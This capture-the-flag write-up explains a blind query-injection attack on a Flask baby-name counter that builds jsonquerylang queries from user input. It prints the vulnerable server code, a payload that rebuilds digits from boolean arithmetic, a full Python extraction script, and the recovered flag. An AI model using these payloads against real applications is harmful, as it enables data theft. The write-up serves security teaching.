# Jey is not my Son &mdash; Solution

## Summary

This web app exposes an endpoint that counts how many babies were born in a given **year** with a given **name**. The challenge hints that there is a baby entry whose `.Name` is `"flag"` and whose `.Year` field **contains the flag string**. Our goal is to extract that flag.

Key constraints and observations:

* The server uses `jsonquerylang` to run a formatted query built from user-supplied `name` and `year`.
* The `name` parameter cannot contain digits (the app rejects names containing any `0–9`).
* The query returns a numeric sum (the number of matching records), so we must perform a *blind* numeric oracle attack: craft filters that evaluate to either `0` or `1` and observe the website’s output.
* Because `name` and `year` are interpolated directly into the query string, there is a query-injection opportunity.

## Python code analysis

Here is the server code:

```python
from flask import Flask, render_template, request
from jsonquerylang import jsonquery
import json
import string

app = Flask(__name__)

with open('data.json') as f:
    data = json.load(f)

def count_baby_names(name: str, year: int) -> int:
    query = f"""
                .collection
                    | filter(.Name == "{name}" and .Year == "{year}")
                    | pick(.Count)
                    | map(values())
                    | flatten()
                    | map(number(get()))
                    | sum()
            """
    output = jsonquery(data, query)
    return int(output)

def contains_digit(name: str) -> bool:
    for num in string.digits:
        if num in name:
            return True
    return False


@app.route("/", methods=["GET"])
def home():
    name = None
    year = None
    result = None
    error = None

    name = request.args.get("name", default="(no name)")
    year = request.args.get("year", type=int)

    if not name or contains_digit(name):
        error = "Please enter a name."
    elif not year:
        error = "Please enter a year."
    else:
        if year < 1880 or year > 2025:
            error = "Year must be between 1880 and 2025."
        try:
            result = count_baby_names(name=name, year=year)
        except Exception as e:
            error = f"Unexpected error: {e}"

    return render_template("index.html", name=name, year=year, count=result, error=error)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

Important points from the code:

1. The `query` string is constructed with f-strings and directly interpolates `name` and `year`. This is the injection surface.
2. `jsonquerylang` evaluates the crafted query over the `data` JSON body.
3. The `contains_digit` check disallows digits in the `name` parameter, so we cannot paste numeric characters directly into `name`.
4. The endpoint’s response is effectively a numeric indicator (the sum), which we can observe on the site — enabling blind enumeration.

## Plan of the attack

1. Use the query-injection vector in the `name` parameter to inject additional `jsonquerylang` expressions.
2. Fixate `.Name == "flag"` in the injected query to target the specific record that contains the secret.
3. Perform a blind, character-by-character leak of the flag by probing whether a specific position of `.Year` equals a guessed character. Each guess will produce either `1` (match) or `0` (no match); the website’s output lets us detect which.
4. Because digits are disallowed in the `name` parameter, we must produce numbers (indices and numeric constants) without typing digits. We simulate numbers using boolean arithmetic and binary composition: `true`/`false` (which evaluate to `1`/`0`) plus exponentiation to build larger numbers.
5. Iterate over candidate characters (`{}`, underscore, digits, letters) until the entire flag is reconstructed.

### Use substring function

We rely on `jsonquerylang`’s `substring` to check a single character of the `.Year` string:

* `substring(.Year, start, end)` produces a one-character string when `end = start + 1`.
* We compare that single-character substring directly against a quoted character (or a character produced via the numeric simulation for digits).

By injecting a filter such as:

```
filter(.Name == "flag" and substring(.Year, <start>, <end>) == "<char>")
```

we make the query return `1` when the character at `start` matches `<char>`, otherwise `0`.


### Output of the query

* If the injected filter matches, the `sum()` in the query returns `1`, which the web UI displays as `1`. If it doesn't match, it returns `0`.
* Therefore, each injected probe yields a binary oracle that lets us learn whether our guessed character is correct.

### Simulate numbers

Because the server rejects digits in the `name` parameter, the exploit generates numbers with boolean arithmetic:

* `true` is 1, `false` is 0
* Build numbers by summing `true` values or using exponentiation (`^`) with repeated `true` additions to obtain powers of two, then combining those to form arbitrary integers.
* The included exploit code contains a helper `convert_num()` that produces a numeric expression using this technique. For example:

  * `0` is represented as `(true-true)`
  * `2` is represented as `(true+true)`
  * Larger numbers are composed by binary decomposition using `^` and sums of `true`.

This allows us to express arbitrary integer positions (start and end indices for `substring`, and numeric character constants used when a guess is a digit) without including explicit digits in the `name` parameter.

## Solution

Below is the attacker-side Python script that automates the blind extraction.

```python
from jsonquerylang import jsonquery
import json
import string
import requests

def count_baby_names(name: str, year: int) -> int:
    url = "https://fortid-jey-is-not-my-son.chals.io/"
    r = requests.get(url, params={'name': name, 'year': year})
    return '<span class="font-extrabold">1</span>' in r.text

def test_query(query):
    return jsonquery([], query)

def convert_num(num):
    if num == 0:
        return "(true-true)"

    two = "(true+true)"

    p = 0
    complete = []
    while num:
        if num % 2 == 1:
            if p == 0:
                complete.append("(true+false)")
            else:
                part = f"{two}^({'+'.join(('true' for _ in range(p)))})"
                complete.append(part)
        num //= 2
        p += 1
    res = '(' + '+'.join(complete) + ')'
    return res

def main():

    guess = ""

    while True:
        for i in "{}_" + string.digits + string.ascii_letters:
            letter = f'"{i}"'
            if i.isdigit():
                letter = f"string({convert_num(int(i))})"
            name = f'" or true) | filter(.Name == "flag" and substring(.Year, \
                     {convert_num(len(guess))}, {convert_num(len(guess)+1)}) == {letter}) \
                     | filter(true or ""=="'
            if count_baby_names(name, 1880):
                guess += i
                print(guess)
                break

if __name__ == "__main__":
    main()

```

### How the script works (brief recap)

* It iterates position-by-position, maintaining `guess` as the recovered prefix of the flag.
* For each candidate character `i` (including `{}`, `_`, digits and letters), the script constructs a `name` parameter that injects a `filter(...)` checking whether the `.Year` character at the current index matches `i`.
* If the server’s page returns `1`, the script appends the character to `guess` and proceeds to the next position.
* When a candidate is a digit, it uses `string(<numeric expression>)` to represent the digit (where the numeric expression is assembled using `convert_num()` to avoid literal digits).
* The `convert_num()` helper builds numbers from boolean values and exponentiation, so the entire payload avoids numeric literals in the `name` parameter.

And we get the flag: `FortID{B3_th3_0n3_wh0_1s_n0t_b1ind_1n_th3_n3w_3r4}`
